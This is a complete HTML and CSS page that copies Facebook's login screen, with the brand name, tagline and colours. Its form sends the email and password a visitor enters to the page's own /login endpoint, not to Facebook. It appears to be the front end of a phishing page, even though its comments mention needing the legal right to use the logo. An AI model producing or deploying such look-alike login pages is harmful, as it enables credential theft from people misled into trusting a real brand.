<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>FaceBook - Log in or Sign up</title>
  <style>
    /* Reset */
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html,body { height:100%; font-family: "Helvetica Neue", Arial, sans-serif; background: #f0f2f5; color: #050505; }

    /* Page layout */
    .container {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 60px 40px;
    }

    .left {
      flex: 1;
      max-width: 640px;
      padding-right: 80px;
    }

    .brand {
      color: #1877f2;            /* facebook blue */
      font-size: 72px;
      font-weight: 700;
      margin-bottom: 10px;
      letter-spacing: -1px;
      font-family: "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
    }

    .tagline {
      font-size: 20px;
      line-height: 1.4;
    }

    /* card */
    .card-wrap {
      width: 360px;
    }

    .card {
      background: #fff;
      border-radius: 8px;
      padding: 18px;
      box-shadow: 0 6px 18px rgba(0,0,0,0.08);
    }

    .logo-row {
      display:flex;
      justify-content:center;
      margin-bottom: 10px;
    }

    /* Placeholder for logo image: replace src with your logo file if you have legal right to use it */
    .logo {
      width: 180px;
      height: 60px;
      object-fit: contain;
      display:block;
    }

    form { margin-top: 6px; }
    input[type="text"], input[type="password"] {
      width:100%;
      padding:12px 14px;
      border-radius:6px;
      border:1px solid #dddfe2;
      margin-bottom:12px;
      font-size:16px;
      outline: none;
    }
    input[type="text"]:focus, input[type="password"]:focus {
      box-shadow: 0 0 0 2px rgba(24,119,242,0.12);
      border-color: #1877f2;
    }

    .btn-primary {
      width:100%;
      padding:12px;
      border-radius:6px;
      border:none;
      background:#1877f2;
      color:#fff;
      font-weight:600;
      font-size:18px;
      cursor:pointer;
    }

    .forgot {
      display:block;
      text-align:center;
      margin-top:10px;
      margin-bottom:10px;
      color:#385898;
      text-decoration:none;
      font-size:14px;
    }

    .divider {
      height:1px;
      background:#e9ebee;
      margin:14px 0;
    }

    .btn-create {
      display:block;
      width:60%;
      margin: 0 auto 8px auto;
      padding:10px;
      border-radius:6px;
      border:none;
      background:#42b72a;
      color:#fff;
      font-weight:600;
      font-size:16px;
      cursor:pointer;
    }

    .meta-links {
      margin-top: 18px;
      text-align:center;
      font-size:13px;
      color:#606770;
    }

    /* footer (bottom row) */
    footer {
      position: fixed;
      left:0; right:0; bottom:0;
      padding:18px 24px;
      font-size:13px;
      color:#777;
      background: transparent;
    }

    footer a { color:#777; text-decoration:none; margin-left:10px; }

    /* responsive rules */
    @media (max-width: 900px) {
      .left { display:none; }
      .container { padding: 24px; }
    }
    @media (max-width:420px) {
      .card-wrap { width:100%; }
      .brand { font-size:44px; }
    }
  </style>
</head>
<body>
  <div class="container" dir="ltr">
    <div class="left" aria-hidden="true">
      <div class="brand">facebook</div>
      <div class="tagline">Connect with friends and the world around you on Facebook.</div>
    </div>

    <div class="card-wrap" role="main" aria-label="Login panel">
      <div class="card">
        <!-- Logo placeholder: replace "logo-placeholder.png" with your image file IF you have permission to use it -->

        <form action="/login" method="POST" autocomplete="off" novalidate>
          <input name="email" type="text" placeholder="Email or phone number" required />
          <input name="password" type="password" placeholder="Password" required />
          <button class="btn-primary" type="submit">Log In</button>
        </form>

        <a class="forgot" href="#" role="link">Forgot password?</a>

        <div class="divider" aria-hidden="true"></div>

        <button class="btn-create" type="button">Create new account</button>

        <div class="meta-links" aria-hidden="true">
          <strong>Create a Page</strong> for a celebrity, brand or business.
        </div>
      </div>
    </div>
  </div>

  <footer aria-hidden="true">
    <a href="#">Sign Up</a>
    <a href="#">Log In</a>
    <a href="#">Messenger</a>
    <a href="#">Privacy</a>
  </footer>
</body>
</html>
